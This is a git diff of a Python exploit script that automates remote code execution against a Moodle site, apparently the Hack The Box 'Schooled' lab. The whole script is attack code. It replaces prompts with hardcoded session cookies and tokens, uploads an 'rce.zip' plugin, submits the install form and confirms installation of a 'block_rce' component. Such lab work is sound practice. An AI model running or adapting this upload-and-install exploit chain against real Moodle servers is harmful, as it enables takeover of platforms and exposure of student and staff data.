@@ -1,8 +1,15 @@
 import requests
 from requests_toolbelt import MultipartEncoder
 
-cookey = input("Please Enter your MoodleSession cookie: ")
 session = requests.Session()
+
+#cookey = input("Please Enter your MoodleSession cookie: ")
+#sesskey = input("Please Enter you session token: ")
+#storage = input("Please enter you storage key: ")
+
+cookey = "MoodleSession=8e9s8j1o2hjj9qil20e3eh6v7g"
+sesskey = "P2O180H9Eh"
+storage = "8f5e1997-29d0-4500-8ba7-f9ef615acbf4"
 proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 
 def upload():
@@ -13,7 +20,7 @@ def upload():
 
     data = MultipartEncoder(fields={ # Need to use MultiPart encoder to generate matching boundaries in the payload so the server can determine when the next filed starts and stops. 
         'repo_upload_file': ('rce.zip', open('/home/tom/Downloads/rce.zip','rb')),
-        'sesskey':'dCcjpTdTnM', # NEED VALID SESSION KEY
+        'sesskey':sesskey, # Needs a valid session token
         'repo_id':'5',
         'itemid':'932337023',
         'author':'Lianne Carter',
@@ -36,7 +43,7 @@ def upload():
         'Cookie': cookey}
 
 
-    r = session.post(url, headers=headers, data=data, proxies=proxies) #Sending HTTP POST request with arguments and storing response in r
+    r = session.post(url, headers=headers, data=data, proxies=proxies) # Sending HTTP POST request with arguments and storing response in r
     
     if r.ok:
         print("[+]Upload Successful")
@@ -64,7 +71,7 @@ def submit():
         'Cookie': cookey,
         'Upgrade-Insecure-Requests': '1'}
 
-    data = "sesskey=dCcjpTdTnM&_qf__tool_installaddon_installfromzip_form=1&mform_showmore_id_general=0&mform_isexpanded_id_general=1&zipfile=789327299&plugintype=&rootdir=&submitbutton=Install+plugin+from+the+ZIP+file" #Needs to be valid. Find a way to automate this
+    data = "sesskey="+sesskey+"&_qf__tool_installaddon_installfromzip_form=1&mform_showmore_id_general=0&mform_isexpanded_id_general=1&zipfile=789327299&plugintype=&rootdir=&submitbutton=Install+plugin+from+the+ZIP+file" #Needs valid session token. Find a way to automate this
     
     r = session.post(url, data=data, headers=headers, proxies=proxies) #Generating HTTP POST request with arguments
     
@@ -90,13 +97,13 @@ def btnClick():
         'Content-Length': '123',
         'Origin': 'http://moodle.schooled.htb',
         'Connection': 'close',
-        'Referer': 'http://moodle.schooled.htb/moodle/admin/tool/installaddon/index.php?installzipcomponent=block_rce&installzipstorage=28e25408-ad7a-4dcd-a6d3-88f4e417d42b&sesskey=WRFW1w2zVH',
+        'Referer': 'http://moodle.schooled.htb/moodle/admin/tool/installaddon/index.php?installzipcomponent=block_rce&installzipstorage='+storage+'&sesskey='+sesskey, #Needs valid session token
         'Cookie': cookey,
         'Upgrade-Insecure-Requests': '1'}
 
-    data = 'installzipcomponent=block_rce&installzipstorage=dc688157-1912-4fc6-9276-29e6029c5697&installzipconfirm=1&sesskey=dCcjpTdTnM' #NEEDS VALID TOKEN (find a way to grab this automatically)
+    data = 'installzipcomponent=block_rce&installzipstorage='+storage+'&installzipconfirm=1&sesskey='+sesskey # Needs valid session token (find a way to grab this automatically)
 
-    r = session.post(url, data=data, headers=headers, proxies=proxies) #Generating HTTP POST request with arguments
+    r = session.post(url, data=data, headers=headers, proxies=proxies) # Generating HTTP POST request with arguments
     
     if r.ok:
         print("[+]Button click Successful")
